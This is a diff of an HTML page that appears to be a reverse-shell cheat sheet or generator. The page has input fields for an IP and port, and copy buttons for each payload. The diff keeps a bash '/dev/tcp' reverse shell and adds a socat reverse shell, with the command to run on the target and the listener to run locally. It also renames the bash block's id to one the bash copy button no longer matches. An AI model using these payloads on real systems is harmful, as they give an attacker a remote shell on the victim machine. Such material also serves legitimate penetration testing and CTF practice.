@@ -145,9 +145,14 @@ Your Port: <input type="text" id="PORT" placeholder="desired port" value="">
 <p style="color:red" id = "result"> </p>
 <h2 id="bash">Bash</h2>
 <p> </p>
-<div id="to-copy-bash" class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -i &gt;&amp; /dev/tcp/YOUR_IP/PORT 0&gt;&amp;<span style="color:#ae81ff">1</span>
+<div id="to-copy-socat" class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -i &gt;&amp; /dev/tcp/YOUR_IP/PORT 0&gt;&amp;<span style="color:#ae81ff">1</span>
 </code></pre></div>
 <button onClick="CopyToClipboard('to-copy-bash')">Copy</button>
+<h2 id="socat">Socat</h2>
+<p> </p>
+<div id="to-copy-socat" class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ON TARGET: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR_IP:PORT  ON LOCAL: socat file:tty,raw,echo=0 tcp-listen:PORT
+</code></pre></div>
+<button onClick="CopyToClipboard('to-copy-socat')">Copy</button>
 <p> </p>
 <h2 id="perl">Perl</h2>
 <p> </p>
